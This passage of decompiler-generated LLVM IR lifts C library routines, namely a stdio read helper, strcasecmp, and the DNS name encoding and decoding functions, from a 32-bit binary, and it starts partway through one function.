  br i1 %v1_805873a, label %dec_label_pc_8058744, label %dec_label_pc_805873c

dec_label_pc_805873c:                             ; preds = %dec_label_pc_8058736
  %v1_805873c = or i32 %v3_805870b, 4
  store i32 %v1_805873c, i32* @ecx, align 4
  %v1_805873f = trunc i32 %v1_805873c to i16
  store i16 %v1_805873f, i16* %v1_805870b, align 2
  br label %dec_label_pc_80587a2

dec_label_pc_8058744:                             ; preds = %dec_label_pc_8058736
  %v3_8058744 = and i16 %v2_805870b, 768
  %v4_8058744 = icmp eq i16 %v3_8058744, 0
  br i1 %v4_8058744, label %dec_label_pc_8058759, label %dec_label_pc_8058749

dec_label_pc_8058749:                             ; preds = %dec_label_pc_8058744
  %v3_8058751 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805e208.488 to i16*))
  %v0_8058759.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058759

dec_label_pc_8058759:                             ; preds = %dec_label_pc_8058744, %dec_label_pc_8058749
  %v0_805878e = phi i32 [ %v2_805873f, %dec_label_pc_8058744 ], [ %v0_8058759.pre, %dec_label_pc_8058749 ]
  %v1_8058759 = add i32 %v0_805878e, 8
  %v2_8058759 = inttoptr i32 %v1_8058759 to i32*
  %v3_8058759 = load i32, i32* %v2_8058759, align 4
  %v1_805875c = add i32 %v0_805878e, 12
  %v2_805875c = inttoptr i32 %v1_805875c to i32*
  %v3_805875c = load i32, i32* %v2_805875c, align 4
  %v15_805875c = icmp eq i32 %v3_805875c, %v3_8058759
  br i1 %v15_805875c, label %dec_label_pc_8058786, label %dec_label_pc_8058761

dec_label_pc_8058761:                             ; preds = %dec_label_pc_8058759
  %v2_8058764 = add i32 %v0_805878e, 24
  %v3_8058764 = inttoptr i32 %v2_8058764 to i32*
  store i32 %v3_8058759, i32* %v3_8058764, align 4
  %v0_8058767 = load i32, i32* @ebx, align 4
  %v2_8058768 = call i32 @__stdio_rfill(i32 %v0_8058767)
  %v1_8058770 = icmp eq i32 %v2_8058768, 0
  br i1 %v1_8058770, label %dec_label_pc_80587a2, label %dec_label_pc_8058774

dec_label_pc_8058774:                             ; preds = %dec_label_pc_8058761
  %v0_8058774 = load i32, i32* @ebx, align 4
  %v1_8058774 = add i32 %v0_8058774, 20
  %v2_8058774 = inttoptr i32 %v1_8058774 to i32*
  %v3_8058774 = load i32, i32* %v2_8058774, align 4
  %v2_8058777 = add i32 %v0_8058774, 24
  %v3_8058777 = inttoptr i32 %v2_8058777 to i32*
  store i32 %v3_8058774, i32* %v3_8058777, align 4
  %v0_805877a = load i32, i32* @ebx, align 4
  %v1_805877a = add i32 %v0_805877a, 16
  %v2_805877a = inttoptr i32 %v1_805877a to i32*
  %v3_805877a = load i32, i32* %v2_805877a, align 4
  br label %dec_label_pc_805877d

dec_label_pc_805877d:                             ; preds = %dec_label_pc_805872e, %entry, %dec_label_pc_8058774
  %v1_8058781 = phi i32 [ %v2_805873f, %dec_label_pc_805872e ], [ %v4_80586d4, %entry ], [ %v0_805877a, %dec_label_pc_8058774 ]
  %v0_805877d = phi i32 [ %v3_805872e, %dec_label_pc_805872e ], [ %v3_80586d8, %entry ], [ %v3_805877a, %dec_label_pc_8058774 ]
  %v1_805877d = inttoptr i32 %v0_805877d to i8*
  %v2_805877d = load i8, i8* %v1_805877d, align 1
  %v3_805877d = zext i8 %v2_805877d to i32
  store i32 %v3_805877d, i32* @edx, align 4
  %v1_8058780 = add i32 %v0_805877d, 1
  %v2_8058781 = add i32 %v1_8058781, 16
  %v3_8058781 = inttoptr i32 %v2_8058781 to i32*
  store i32 %v1_8058780, i32* %v3_8058781, align 4
  %v0_80587a8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80587a5

dec_label_pc_8058786:                             ; preds = %dec_label_pc_8058759
  %v2_8058789 = ptrtoint i8* %stack_var_-5 to i32
  %v5_805878e = inttoptr i32 %v0_805878e to i16*
  %v5_805878f = call i32 @__stdio_READ(i16* %v5_805878e, i32 %v2_8058789, i32 1)
  %v1_8058797 = icmp eq i32 %v5_805878f, 0
  br i1 %v1_8058797, label %dec_label_pc_80587a2, label %dec_label_pc_805879b

dec_label_pc_805879b:                             ; preds = %dec_label_pc_8058786
  %v3_805879b = load i8, i8* %stack_var_-5, align 1
  %v4_805879b = sext i8 %v3_805879b to i32
  store i32 %v4_805879b, i32* @edx, align 4
  br label %dec_label_pc_80587a5

dec_label_pc_80587a2:                             ; preds = %dec_label_pc_8058786, %dec_label_pc_8058761, %dec_label_pc_80586f3, %dec_label_pc_805873c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80587a5

dec_label_pc_80587a5:                             ; preds = %dec_label_pc_805879b, %dec_label_pc_805877d, %dec_label_pc_8058713, %dec_label_pc_80587a2
  %v0_80587a8 = phi i32 [ %v4_805879b, %dec_label_pc_805879b ], [ %v0_80587a8.pre, %dec_label_pc_805877d ], [ %v1_8058729, %dec_label_pc_8058713 ], [ -1, %dec_label_pc_80587a2 ]
  store i32 %v0_80586d0, i32* @ebx, align 4
  ret i32 %v0_80587a8

; uselistorder directives
  uselistorder i32 %v0_805877d, { 1, 0 }
  uselistorder i32 %v3_8058759, { 1, 0 }
  uselistorder i32 %v0_805878e, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805872e, { 1, 0, 2 }
  uselistorder i32 %v1_8058729, { 1, 0 }
  uselistorder i16 %v2_805870b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805873f, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_805e240.481, { 1, 0, 2 }
  uselistorder i32 -2, { 0, 2, 6, 14, 15, 1, 13, 17, 18, 3, 5, 4, 19, 7, 8, 9, 16, 10, 11, 12 }
  uselistorder i32 40, { 4, 5, 6, 7, 8, 9, 1, 2, 10, 11, 12, 13, 3, 0 }
  uselistorder i32 -256, { 67, 1, 68, 0, 69, 14, 21, 70, 71, 3, 48, 47, 2, 72, 73, 74, 75, 6, 76, 4, 77, 5, 78, 102, 8, 50, 49, 7, 79, 80, 81, 82, 83, 84, 85, 86, 15, 87, 88, 89, 104, 16, 26, 17, 105, 106, 65, 64, 9, 100, 101, 90, 91, 92, 93, 94, 95, 96, 10, 97, 98, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 11, 12, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 18, 19, 20, 13, 66, 99, 103 }
  uselistorder i32 36, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 3, 4, 18, 6, 19, 20, 21, 22, 5, 1, 0 }
  uselistorder i16 2, { 0, 3, 1, 2, 4 }
  uselistorder i32 128, { 4, 11, 15, 10, 13, 5, 6, 14, 0, 7, 8, 16, 17, 18, 19, 20, 3, 2, 9, 21, 12, 1 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder i32 24, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 5, 11, 21, 12, 31, 32, 33, 34, 35, 36, 37, 38, 2, 13, 14, 15, 16, 17, 18, 3, 19, 4, 6, 7, 8, 9, 10, 20, 1 }
  uselistorder label %dec_label_pc_80587a5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80587a2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805877d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058759, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80587ad = load i32, i32* bitcast (i32** @global_var_805e440.502 to i32*), align 64
  %v4_80587b6 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_80587be

dec_label_pc_80587be:                             ; preds = %dec_label_pc_80587db, %entry
  %storemerge = phi i32 [ %v4_80587b6, %entry ], [ %v1_80587dc, %dec_label_pc_80587db ]
  %v0_80587dc = phi i32 [ %v4_80587b6, %entry ], [ %v1_80587dc, %dec_label_pc_80587db ]
  %v0_80587e16 = phi i32 [ 0, %entry ], [ %v0_80587e17, %dec_label_pc_80587db ]
  %v0_80587db = phi i32 [ %arg2, %entry ], [ %v1_80587db, %dec_label_pc_80587db ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_80587be = icmp eq i32 %v0_80587dc, %v0_80587db
  %.pre = inttoptr i32 %v0_80587dc to i8*
  br i1 %v12_80587be, label %dec_label_pc_80587d6, label %dec_label_pc_80587c2

dec_label_pc_80587c2:                             ; preds = %dec_label_pc_80587be
  %v2_80587c2 = load i8, i8* %.pre, align 1
  %v3_80587c2 = zext i8 %v2_80587c2 to i32
  %v2_80587c5 = mul nuw nsw i32 %v3_80587c2, 2
  %v3_80587c5 = add i32 %v2_80587c5, %v0_80587ad
  %v4_80587c5 = inttoptr i32 %v3_80587c5 to i16*
  %v5_80587c5 = load i16, i16* %v4_80587c5, align 2
  %v6_80587c5 = sext i16 %v5_80587c5 to i32
  %v1_80587c9 = inttoptr i32 %v0_80587db to i8*
  %v2_80587c9 = load i8, i8* %v1_80587c9, align 1
  %v3_80587c9 = zext i8 %v2_80587c9 to i32
  %v2_80587cc = mul nuw nsw i32 %v3_80587c9, 2
  %v3_80587cc = add i32 %v2_80587cc, %v0_80587ad
  %v4_80587cc = inttoptr i32 %v3_80587cc to i16*
  %v5_80587cc = load i16, i16* %v4_80587cc, align 2
  %v6_80587cc = sext i16 %v5_80587cc to i32
  %v2_80587d0 = sub nsw i32 %v6_80587c5, %v6_80587cc
  %v12_80587d0 = icmp eq i32 %v2_80587d0, 0
  store i32 %v2_80587d0, i32* @edx, align 4
  %v1_80587d4 = icmp eq i1 %v12_80587d0, false
  br i1 %v1_80587d4, label %dec_label_pc_80587df, label %dec_label_pc_80587d6

dec_label_pc_80587d6:                             ; preds = %dec_label_pc_80587be, %dec_label_pc_80587c2
  %v0_80587e17 = phi i32 [ %v2_80587d0, %dec_label_pc_80587c2 ], [ %v0_80587e16, %dec_label_pc_80587be ]
  %v2_80587d6 = load i8, i8* %.pre, align 1
  %v3_80587d6 = icmp eq i8 %v2_80587d6, 0
  br i1 %v3_80587d6, label %dec_label_pc_80587df, label %dec_label_pc_80587db

dec_label_pc_80587db:                             ; preds = %dec_label_pc_80587d6
  %v1_80587db = add i32 %v0_80587db, 1
  %v1_80587dc = add i32 %v0_80587dc, 1
  br label %dec_label_pc_80587be

dec_label_pc_80587df:                             ; preds = %dec_label_pc_80587d6, %dec_label_pc_80587c2
  %v0_80587e1 = phi i32 [ %v0_80587e17, %dec_label_pc_80587d6 ], [ %v2_80587d0, %dec_label_pc_80587c2 ]
  ret i32 %v0_80587e1

; uselistorder directives
  uselistorder i32 %v1_80587dc, { 1, 0 }
  uselistorder i32 %v0_80587e17, { 1, 0 }
  uselistorder i32 %v2_80587d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80587db, { 1, 2, 0 }
  uselistorder i32 %v0_80587dc, { 2, 1, 0 }
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 63, 65, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 27, 25, 24, 28, 29, 30, 31, 34, 35, 33, 32, 36, 39, 38, 37, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50, 51, 54, 55, 56, 52, 57, 53, 59, 58, 60, 62, 61, 64 }
  uselistorder label %dec_label_pc_80587d6, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80587e5 = load i32, i32* @edi, align 4
  %v0_80587e6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80587ed = ptrtoint i8* %arg1 to i32
  store i32 %v4_80587ed, i32* @edi, align 4
  %v1_805884c5 = icmp eq i8* %arg1, null
  br i1 %v1_805884c5, label %dec_label_pc_8058855, label %dec_label_pc_8058850.lr.ph

dec_label_pc_8058850.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8058850

dec_label_pc_80587f3:                             ; preds = %dec_label_pc_8058850
  %v5_80587f8 = call i32 @__GI_strchr(i8* %v1_8058850, i32 46)
  %v1_8058800 = icmp eq i32 %v5_80587f8, 0
  br i1 %v1_8058800, label %dec_label_pc_805880c, label %dec_label_pc_8058806

dec_label_pc_8058806:                             ; preds = %dec_label_pc_80587f3
  %v1_8058808 = load i32, i32* @edi, align 4
  %v2_8058808 = sub i32 %v5_80587f8, %v1_8058808
  br label %dec_label_pc_805881a

dec_label_pc_805880c:                             ; preds = %dec_label_pc_80587f3
  %v0_805880f = load i32, i32* @edi, align 4
  %v5_805880f = inttoptr i32 %v0_805880f to i8*
  %v3_8058810 = call i32 @strlen(i8* %v5_805880f)
  br label %dec_label_pc_805881a

dec_label_pc_805881a:                             ; preds = %dec_label_pc_8058806, %dec_label_pc_805880c
  %v0_805882d = phi i32 [ %v3_8058810, %dec_label_pc_805880c ], [ %v2_8058808, %dec_label_pc_8058806 ]
  store i32 %v0_805882d, i32* @esi, align 4
  %v1_805881a = icmp eq i32 %v0_805882d, 0
  %v3_805881a = trunc i32 %v0_805882d to i8
  br i1 %v1_805881a, label %dec_label_pc_8058869, label %dec_label_pc_805881e

dec_label_pc_805881e:                             ; preds = %dec_label_pc_805881a
  %v1_8058822 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058822 = sub i32 %arg3, %v1_8058822
  %v1_8058824 = add i32 %v2_8058822, -1
  %v7_8058825 = icmp ult i32 %v0_805882d, %v1_8058824
  %v1_8058827 = icmp eq i1 %v7_8058825, false
  br i1 %v1_8058827, label %dec_label_pc_8058869, label %dec_label_pc_8058829

dec_label_pc_8058829:                             ; preds = %dec_label_pc_805881e
  store i32 %arg2, i32* @edx, align 4
  %v4_805882f = add i32 %v1_8058822, %arg2
  %v5_805882f = inttoptr i32 %v4_805882f to i8*
  store i8 %v3_805881a, i8* %v5_805882f, align 1
  %v0_8058832 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058832 = add i32 %v0_8058832, 1
  %v0_8058834 = load i32, i32* @edx, align 4
  %v0_8058836 = load i32, i32* @esi, align 4
  %v2_8058837 = add i32 %v1_8058832, %v0_8058834
  %v0_8058839 = load i32, i32* @edi, align 4
  %v2_805883a = add i32 %v0_8058836, %v1_8058832
  store i32 %v2_805883a, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_8058837 to i16*
  %v7_805883d = call i32 @memcpy(i16* %tmp30, i32 %v0_8058839, i32 %v0_8058836)
  %v1_8058849 = add i32 %v5_80587f8, 1
  br i1 %v1_8058800, label %dec_label_pc_8058855, label %dec_label_pc_805884c

dec_label_pc_805884c:                             ; preds = %dec_label_pc_8058829
  store i32 %v1_8058849, i32* @edi, align 4
  %v1_805884c = icmp eq i32 %v1_8058849, 0
  br i1 %v1_805884c, label %dec_label_pc_8058855, label %dec_label_pc_8058850

dec_label_pc_8058850:                             ; preds = %dec_label_pc_8058850.lr.ph, %dec_label_pc_805884c
  %v0_80587f7 = phi i32 [ %v4_80587ed, %dec_label_pc_8058850.lr.ph ], [ %v1_8058849, %dec_label_pc_805884c ]
  %v1_8058850 = inttoptr i32 %v0_80587f7 to i8*
  %v2_8058850 = load i8, i8* %v1_8058850, align 1
  %v3_8058850 = icmp eq i8 %v2_8058850, 0
  %v1_8058853 = icmp eq i1 %v3_8058850, false
  br i1 %v1_8058853, label %dec_label_pc_80587f3, label %dec_label_pc_8058855

dec_label_pc_8058855:                             ; preds = %dec_label_pc_805884c, %dec_label_pc_8058850, %dec_label_pc_8058829, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8058869, label %dec_label_pc_805885c

dec_label_pc_805885c:                             ; preds = %dec_label_pc_8058855
  %v1_8058860 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058860 = add i32 %v1_8058860, %arg2
  %v3_8058860 = inttoptr i32 %v2_8058860 to i8*
  store i8 0, i8* %v3_8058860, align 1
  %v0_8058864 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058864 = add i32 %v0_8058864, 1
  br label %dec_label_pc_805886c

dec_label_pc_8058869:                             ; preds = %dec_label_pc_805881e, %dec_label_pc_805881a, %dec_label_pc_8058855
  br label %dec_label_pc_805886c

dec_label_pc_805886c:                             ; preds = %dec_label_pc_805885c, %dec_label_pc_8058869
  %storemerge3 = phi i32 [ %v1_8058864, %dec_label_pc_805885c ], [ -1, %dec_label_pc_8058869 ]
  store i32 %v0_80587e6, i32* @esi, align 4
  store i32 %v0_80587e5, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_8058850, { 1, 0 }
  uselistorder i32 %v1_8058849, { 0, 2, 1 }
  uselistorder i32 %v0_8058836, { 1, 0 }
  uselistorder i32 %v5_80587f8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 7, 6, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 14, 15 }
  uselistorder i32 46, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25 }
  uselistorder label %dec_label_pc_805886c, { 1, 0 }
  uselistorder label %dec_label_pc_8058869, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058855, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8058850, { 1, 0 }
  uselistorder label %dec_label_pc_805881a, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8058876 = load i32, i32* @esi, align 4
  %v4_805887b = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_805887b, label %dec_label_pc_8058942, label %dec_label_pc_805888a

dec_label_pc_805888a:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_805892a2541 = add i32 %arg2, %arg1
  %v3_805892a2642 = inttoptr i32 %v2_805892a2541 to i8*
  %v4_805892a2743 = load i8, i8* %v3_805892a2642, align 1
  %v1_805892e2945 = icmp eq i8 %v4_805892a2743, 0
  %v1_80589303046 = icmp eq i1 %v1_805892e2945, false
  br i1 %v1_80589303046, label %dec_label_pc_8058898.lr.ph, label %dec_label_pc_8058936

dec_label_pc_8058898:                             ; preds = %dec_label_pc_8058898.lr.ph, %dec_label_pc_80588b1
  %v0_80588a2 = phi i32 [ %v0_80588a2.pre, %dec_label_pc_8058898.lr.ph ], [ %v4_80588c2, %dec_label_pc_80588b1 ]
  %v8_805889837 = phi i1 [ %v8_80588983151, %dec_label_pc_8058898.lr.ph ], [ true, %dec_label_pc_80588b1 ]
  %v5_805892a36.in = phi i8 [ %v5_805892a2850.in, %dec_label_pc_8058898.lr.ph ], [ %v4_805892a, %dec_label_pc_80588b1 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8058898.lr.ph ], [ 0, %dec_label_pc_80588b1 ]
  %v0_805889f34 = phi i32 [ %v0_805889f.ph47, %dec_label_pc_8058898.lr.ph ], [ %v2_80588d0, %dec_label_pc_80588b1 ]
  %v5_805892a36 = zext i8 %v5_805892a36.in to i32
  %v1_805889f = add i32 %v0_805889f34, 1
  store i32 %v1_805889f, i32* @esi, align 4
  %v3_80588a2 = select i1 %v8_805889837, i32 2, i32 1
  %v4_80588a2 = add i32 %v3_80588a2, %v0_80588a2
  store i32 %v4_80588a2, i32* %ebp.global-to-local, align 4
  %v1_80588a5 = and i32 %v5_805892a36, 192
  %v6_80588aa = icmp eq i32 %v1_80588a5, 192
  %v1_80588af = icmp eq i1 %v6_80588aa, false
  br i1 %v1_80588af, label %dec_label_pc_80588d4, label %dec_label_pc_80588b1

dec_label_pc_80588b1:                             ; preds = %dec_label_pc_8058898
  %v2_80588be = add i32 %v1_805889f, %arg1
  %v3_80588be = inttoptr i32 %v2_80588be to i8*
  %v4_80588be = load i8, i8* %v3_80588be, align 1
  %v5_80588be = zext i8 %v4_80588be to i32
  %v4_80588c2 = add i32 %v3_80588a2, %v4_80588a2
  store i32 %v4_80588c2, i32* %ebp.global-to-local, align 4
  %v1_80588c5 = mul nuw nsw i32 %v5_805892a36, 256
  %v2_80588c8 = and i32 %v1_80588c5, 16128
  %v2_80588d0 = or i32 %v5_80588be, %v2_80588c8
  store i32 %v2_80588d0, i32* @edx, align 4
  store i32 %v1_80588f1.ph48, i32* @ecx, align 4
  %v2_805892a = add i32 %v2_80588d0, %arg1
  %v3_805892a = inttoptr i32 %v2_805892a to i8*
  %v4_805892a = load i8, i8* %v3_805892a, align 1
  %v1_805892e = icmp eq i8 %v4_805892a, 0
  %v1_8058930 = icmp eq i1 %v1_805892e, false
  br i1 %v1_8058930, label %dec_label_pc_8058898, label %dec_label_pc_8058936

dec_label_pc_80588d4:                             ; preds = %dec_label_pc_8058898
  %v2_80588d4 = add i32 %v5_805892a36, %v1_80588f1.ph48
  %v1_80588d9 = add i32 %v2_80588d4, 1
  store i32 %v1_80588d9, i32* @edi, align 4
  %v10_80588da = icmp ult i32 %v1_80588d9, %arg4
  %v1_80588e2 = icmp eq i1 %v10_80588da, false
  br i1 %v1_80588e2, label %dec_label_pc_8058942, label %dec_label_pc_80588e4

dec_label_pc_80588e4:                             ; preds = %dec_label_pc_80588d4
  %v2_80588ea = add i32 %v1_805889f, %arg1
  %v2_80588f1 = add i32 %v1_80588f1.ph48, %arg3
  %v3_80588f4 = inttoptr i32 %v2_80588f1 to i16*
  %v4_80588f4 = call i32 @memcpy(i16* %v3_80588f4, i32 %v2_80588ea, i32 %v5_805892a36)
  %v0_8058900 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8058909 = load i32, i32* @esi, align 4
  %v2_8058909 = add i32 %v0_8058909, %v5_805892a36
  store i32 %v2_8058909, i32* @edx, align 4
  %v1_8058910 = icmp eq i1 %v8_805889837, false
  %v2_8058900 = select i1 %v1_8058910, i32 %v5_805892a36, i32 0
  %v4_8058910 = add i32 %v0_8058900, %v2_8058900
  store i32 %v4_8058910, i32* %ebp.global-to-local, align 4
  %v4_8058921 = add i32 %v2_80588d4, %arg3
  %v5_8058921 = inttoptr i32 %v4_8058921 to i8*
  store i8 46, i8* %v5_8058921, align 1
  %v0_8058924.pre = load i32, i32* @edi, align 4
  %v1_805892a.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8058924.pre, i32* @ecx, align 4
  %v2_805892a25 = add i32 %v1_805892a.pre.pre, %arg1
  %v3_805892a26 = inttoptr i32 %v2_805892a25 to i8*
  %v4_805892a27 = load i8, i8* %v3_805892a26, align 1
  %v1_805892e29 = icmp eq i8 %v4_805892a27, 0
  %v1_805893030 = icmp eq i1 %v1_805892e29, false
  %v8_805889831 = icmp eq i8 %stack_var_-17.135, 0
  %v0_80588a2.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805893030, label %dec_label_pc_8058898.lr.ph, label %dec_label_pc_8058936

dec_label_pc_8058898.lr.ph:                       ; preds = %dec_label_pc_80588e4, %dec_label_pc_805888a
  %v0_80588a2.pre = phi i32 [ 0, %dec_label_pc_805888a ], [ %v0_80588a2.pre.pre, %dec_label_pc_80588e4 ]
  %v8_80588983151 = phi i1 [ false, %dec_label_pc_805888a ], [ %v8_805889831, %dec_label_pc_80588e4 ]
  %v5_805892a2850.in = phi i8 [ %v4_805892a2743, %dec_label_pc_805888a ], [ %v4_805892a27, %dec_label_pc_80588e4 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_805888a ], [ %stack_var_-17.135, %dec_label_pc_80588e4 ]
  %v1_80588f1.ph48 = phi i32 [ 0, %dec_label_pc_805888a ], [ %v0_8058924.pre, %dec_label_pc_80588e4 ]
  %v0_805889f.ph47 = phi i32 [ %arg2, %dec_label_pc_805888a ], [ %v1_805892a.pre.pre, %dec_label_pc_80588e4 ]
  br label %dec_label_pc_8058898

dec_label_pc_8058936:                             ; preds = %dec_label_pc_80588e4, %dec_label_pc_80588b1, %dec_label_pc_805888a
  %v0_805893b = phi i32 [ 0, %dec_label_pc_805888a ], [ %v4_80588c2, %dec_label_pc_80588b1 ], [ %v0_80588a2.pre.pre, %dec_label_pc_80588e4 ]
  %v8_8058898.lcssa = phi i1 [ false, %dec_label_pc_805888a ], [ true, %dec_label_pc_80588b1 ], [ %v8_805889831, %dec_label_pc_80588e4 ]
  %v2_805893d = zext i1 %v8_8058898.lcssa to i32
  %v3_805893d = add i32 %v0_805893b, 1
  %v4_805893d = add i32 %v3_805893d, %v2_805893d
  br label %dec_label_pc_8058945

dec_label_pc_8058942:                             ; preds = %dec_label_pc_80588d4, %entry
  br label %dec_label_pc_8058945

dec_label_pc_8058945:                             ; preds = %dec_label_pc_8058936, %dec_label_pc_8058942
  %storemerge = phi i32 [ %v4_805893d, %dec_label_pc_8058936 ], [ -1, %dec_label_pc_8058942 ]
  store i32 %v0_8058876, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80588f1.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_805892a, { 1, 0 }
  uselistorder i32 %v2_80588d0, { 0, 2, 1 }
  uselistorder i32 %v4_80588c2, { 0, 2, 1 }
  uselistorder i32 %v5_805892a36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 1, 32, 35, 6, 0, 34, 33, 27, 2, 28, 3, 29, 30, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 4, 5, 31, 26 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 3, 4, 5, 6, 7, 8, 9, 14, 18, 19, 15, 17, 20, 13, 10, 11, 12, 16, 0, 1, 2 }
  uselistorder i32* @edi, { 3, 132, 133, 20, 134, 135, 136, 19, 137, 138, 139, 2, 0, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 28, 5, 4, 29, 30, 31, 32, 33, 36, 34, 35, 155, 7, 156, 8, 157, 158, 6, 159, 160, 161, 162, 167, 168, 1, 163, 164, 165, 166, 169, 170, 171, 172, 9, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 10, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 88, 89, 90, 91, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 11, 228, 229, 230, 231, 232, 233, 234, 328, 329, 330, 12, 331, 332, 335, 336, 285, 286, 287, 337, 338, 353, 105, 13, 106, 107, 108, 37, 38, 39, 40, 41, 42, 43, 113, 114, 115, 116, 117, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 14, 318, 319, 320, 321, 322, 264, 265, 15, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 235, 236, 16, 237, 351, 352, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 17, 262, 25, 26, 27, 248, 18, 249, 250, 263, 347, 348, 349, 350, 109, 110, 111, 112, 333, 334, 118, 119, 283, 284, 44, 45, 46, 288, 289, 344, 345, 346, 290, 291, 47, 48, 49, 339, 340, 341, 342, 343, 50, 51, 52, 55, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 21, 22, 23, 24, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 278, 279, 280, 281, 282, 292, 293, 294, 323, 324, 325, 326, 327 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 10, 46, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 47, 22, 23, 24, 45, 25, 26, 27, 28, 0, 1, 29, 2, 48, 30, 31, 52, 32, 33, 4, 50, 51, 3, 34, 35, 36, 37, 38, 39, 40, 41, 42, 49, 53, 43, 44 }
  uselistorder i1 true, { 2, 4, 8, 9, 10, 11, 12, 13, 3, 6, 7, 0, 5, 1 }
